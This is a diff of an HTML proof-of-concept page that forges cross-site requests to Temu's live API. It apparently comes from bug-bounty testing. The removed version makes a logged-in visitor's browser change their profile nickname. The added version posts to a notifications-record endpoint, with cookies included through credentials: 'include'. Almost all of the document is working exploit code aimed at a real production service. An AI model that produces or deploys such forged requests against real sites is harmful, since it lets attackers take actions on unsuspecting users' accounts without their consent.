@@ -2,47 +2,35 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF PoC - Temu Profile Update</title>
+  <title>CSRF PoC - Temu Notifications Record</title>
 </head>
 <body>
-  <h2>CSRF PoC - Update Nickname</h2>
-  <form id="csrfForm" method="POST" action="https://www.temu.com/api/bg-barbera-api/user/profile/update" enctype="application/json">
-    <input type="hidden" name="type" value="nickname">
-    <input type="hidden" name="nickname" value="Hunt">
-    <input type="hidden" name="trp_track" value="">
-    <button type="button" onclick="submitCSRF()">Submit CSRF</button>
-  </form>
-
-  <div id="error" style="color:red; margin-top:20px;"></div>
+  <h2>CSRF PoC - Record Notification</h2>
+  <button onclick="sendCSRF()">Submit CSRF Request</button>
+  <div id="result" style="margin-top: 20px; color: red;"></div>
 
   <script>
-    function submitCSRF() {
-      const data = JSON.stringify({
-        type: "nickname",
-        nickname: "Hunt",
-        trp_track: null
-      });
+    function sendCSRF() {
+      const payload = {
+        id: 2,
+        type: 3,
+        status: 0
+      };
 
-      fetch("https://www.temu.com/api/bg-barbera-api/user/profile/update", {
+      fetch("https://www.temu.com/api/bg/lome/user/notifications/record", {
         method: "POST",
+        credentials: "include", // critical for sending cookies
         headers: {
           "Content-Type": "application/json;charset=UTF-8"
-          // Normally no auth headers are set in CSRF
         },
-        body: data,
-        credentials: "include" // Critical to include cookies for CSRF
+        body: JSON.stringify(payload)
       })
-      .then(response => {
-        if (!response.ok) {
-          return response.text().then(text => {
-            document.getElementById("error").textContent = "Request failed: " + text;
-          });
-        } else {
-          document.getElementById("error").textContent = "Request sent. Check for nickname change.";
-        }
-      })
+      .then(response => response.text().then(text => {
+        document.getElementById("result").innerText = 
+          response.ok ? "✅ CSRF request sent successfully." : `❌ Request failed: ${text}`;
+      }))
       .catch(err => {
-        document.getElementById("error").textContent = "Fetch error: " + err;
+        document.getElementById("result").innerText = "⚠️ Error: " + err;
       });
     }
   </script>
